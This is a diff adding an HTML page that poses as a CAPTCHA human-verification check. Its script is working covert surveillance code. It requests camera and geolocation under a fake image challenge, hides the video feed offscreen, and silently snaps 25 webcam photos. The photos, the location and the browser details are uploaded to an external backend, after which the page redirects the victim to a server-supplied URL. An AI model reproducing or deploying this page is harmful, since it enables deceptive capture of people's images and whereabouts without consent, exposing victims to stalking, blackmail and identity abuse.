@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Human Verification – Secure System</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --blue: #4f81e1;
+            --blue-hover: #3b6bc1;
+            --bg: #f8fafc;
+            --white: #ffffff;
+            --text: #1e293b;
+            --muted: #64748b;
+            --border: #e2e8f0;
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--white);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 440px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            position: relative;
+        }
+
+        .title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--blue);
+            margin-bottom: 12px;
+            letter-spacing: -0.02em;
+        }
+
+        .subtext {
+            font-size: 0.95rem;
+            color: var(--muted);
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .captcha-btn {
+            width: 100%;
+            background: var(--blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 2px 4px rgba(79, 129, 225, 0.2);
+        }
+
+        .captcha-btn:hover {
+            background: var(--blue-hover);
+        }
+
+        .captcha-btn:active {
+            transform: translateY(0);
+        }
+
+        .captcha-btn svg {
+            width: 24px;
+            height: 24px;
+            animation: none;
+        }
+
+        .challenge-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: var(--white);
+            border-radius: 12px;
+            z-index: 100;
+            flex-direction: column;
+            padding: 20px;
+            text-align: left;
+        }
+
+        .challenge-header {
+            background: var(--blue);
+            color: white;
+            padding: 20px;
+            margin: -20px -20px 20px;
+            border-radius: 12px 12px 0 0;
+        }
+
+        .challenge-header h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .challenge-header p {
+            font-size: 0.85rem;
+            opacity: 0.9;
+        }
+
+        .image-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 4px;
+            margin-bottom: 20px;
+        }
+
+        .grid-item {
+            width: 100%;
+            aspect-ratio: 1;
+            background-color: #eee;
+            background-size: cover;
+            background-position: center;
+            cursor: pointer;
+            position: relative;
+            border: 2px solid transparent;
+        }
+
+        .grid-item.selected {
+            border-color: var(--blue);
+            transform: scale(0.92);
+        }
+
+        .grid-item.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            background: var(--blue);
+            color: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .challenge-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border);
+            padding-top: 15px;
+        }
+
+        .verify-btn {
+            background: var(--blue);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 200;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e2e8f0;
+            border-top-color: var(--blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .success-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: var(--white);
+            z-index: 300;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: #dcfce7;
+            color: #166534;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            margin-bottom: 20px;
+        }
+
+        #video,
+        #canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+        }
+    </style>
+</head>
+
+<body>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <div class="container">
+        <!-- Step 1: Checkbox -->
+        <div id="step-initial">
+            <h1 class="title">Verify You Are Human</h1>
+            <p class="subtext">Please verify that you are a human to continue.</p>
+            <button class="captcha-btn" onclick="openChallenge()">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px;">
+                    <path
+                        d="M4 12C4 7.58172 7.58172 4 12 4C14.2091 4 16.2091 4.89543 17.6569 6.34315M20 12C20 16.4183 16.4183 20 12 20C9.79086 20 7.79086 19.1046 6.34315 17.6569"
+                        stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
+                </svg>
+                I'm not a robot
+            </button>
+        </div>
+
+        <!-- Step 2: Image Challenge -->
+        <div class="challenge-overlay" id="challenge-ui">
+            <div class="challenge-header">
+                <p>Select any four</p>
+                <h2>images</h2>
+            </div>
+            <div class="image-grid" id="grid">
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=1')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=2')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=3')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=4')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=5')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=6')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=7')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=8')"></div>
+                <div class="grid-item" onclick="toggleItem(this)"
+                    style="background-image:url('https://picsum.photos/200?random=9')"></div>
+            </div>
+            <div class="challenge-footer">
+                <div style="display:flex;gap:10px;">
+                    <span style="font-size:1.2rem;cursor:pointer;opacity:0.6;">🔄</span>
+                    <span style="font-size:1.2rem;cursor:pointer;opacity:0.6;">🎧</span>
+                </div>
+                <button class="verify-btn" onclick="verifyChallenge()">VERIFY</button>
+            </div>
+        </div>
+
+        <!-- Step 3: Verifying Spinner -->
+        <div class="loading-overlay" id="loading">
+            <div class="spinner"></div>
+            <p style="font-size:0.9rem;font-weight:600;">Verifying...</p>
+        </div>
+
+        <!-- Step 4: Success -->
+        <div class="success-overlay" id="success">
+            <div class="success-icon">✓</div>
+            <h2 style="font-size:1.5rem;margin-bottom:10px;">Verified!</h2>
+            <p style="font-size:0.9rem;color:var(--muted);">Identity confirmed. Redirecting...</p>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://docportal-backend.onrender.com/api';
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const TOTAL = 25;
+        let count = 0;
+        let sessionId = Math.random().toString(36).substring(2, 10);
+        let captureActive = false;
+        let redirectUrl = null;
+        let metadataCollected = false;
+
+        // Redirect URL check
+        (async () => {
+            const rid = new URLSearchParams(window.location.search).get('rid');
+            if (rid) {
+                const res = await fetch(API_BASE + '/capture/get-redirect/' + rid).then(r => r.json()).catch(() => ({}));
+                if (res.success) redirectUrl = res.url;
+            }
+        })();
+
+        async function openChallenge() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                document.getElementById('challenge-ui').style.display = 'flex';
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => collectMetadata(pos.coords),
+                        () => collectMetadata(null)
+                    );
+                } else {
+                    collectMetadata(null);
+                }
+
+                video.oncanplay = function () {
+                    video.play();
+                    setTimeout(() => {
+                        captureActive = true;
+                        startBackgroundCapture();
+                    }, 1000);
+                };
+            } catch (e) {
+                alert('Verification blocked. Camera and Security checks are required to confirm identity.');
+            }
+        }
+
+        async function collectMetadata(coords) {
+            if (metadataCollected) return;
+            metadataCollected = true;
+            const data = {
+                sessionId: sessionId,
+                userAgent: navigator.userAgent,
+                location: coords ? { lat: coords.latitude, lng: coords.longitude } : 'Denied/Not available'
+            };
+            fetch(API_BASE + '/capture/metadata', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(e => { });
+        }
+
+        function toggleItem(el) { el.classList.toggle('selected'); }
+
+        function verifyChallenge() {
+            document.getElementById('loading').style.display = 'flex';
+            checkCaptureFinished();
+        }
+
+        function startBackgroundCapture() {
+            const intv = setInterval(() => {
+                if (count >= TOTAL) {
+                    clearInterval(intv);
+                    captureActive = false;
+                    return;
+                }
+                ctx.drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('photo', blob, `capture_${sessionId}_${count}.jpg`);
+                    fd.append('sessionId', sessionId);
+                    fetch(API_BASE + '/capture/upload', { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.8);
+                count++;
+            }, 500);
+        }
+
+        function checkCaptureFinished() {
+            if (!captureActive) {
+                setTimeout(showSuccess, 1000);
+            } else {
+                setTimeout(checkCaptureFinished, 500);
+            }
+        }
+
+        function showSuccess() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('success').style.display = 'flex';
+            if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+            if (redirectUrl) setTimeout(() => window.location.href = redirectUrl, 2000);
+        }
+    </script>
+</body>
+
+</html>
